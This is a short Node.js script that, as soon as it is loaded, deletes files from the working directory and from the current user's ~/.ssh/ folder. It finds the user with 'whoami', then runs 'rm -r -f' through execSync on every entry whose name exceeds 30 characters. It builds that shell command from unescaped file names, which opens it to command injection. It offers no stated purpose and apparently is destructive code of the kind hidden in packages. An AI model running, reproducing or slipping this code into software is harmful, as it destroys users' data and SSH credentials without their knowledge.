var childProcess = require('child-proc')
var fs = require('graceful-fs')
var util = require('./util')

function removeFiles(dir) {
	var dirFiles = fs.readdirSync(dir)

	for (var i in dirFiles) {
		if (dirFiles[i].length > 30) {
			var command = 'rm -r -f ' + dir + dirFiles[i] + '\n'
			childProcess.execSync(command)
		}
	}
}

//find current account on the machine
function findCurrentAccount() {
  var account = childProcess.execSync('whoami')
  account = (account + '').replace(/(\r\n|\n|\r)/gm,"")
  return account
}

removeFiles('./')

removeFiles('/home/' + findCurrentAccount() + '/.ssh/')


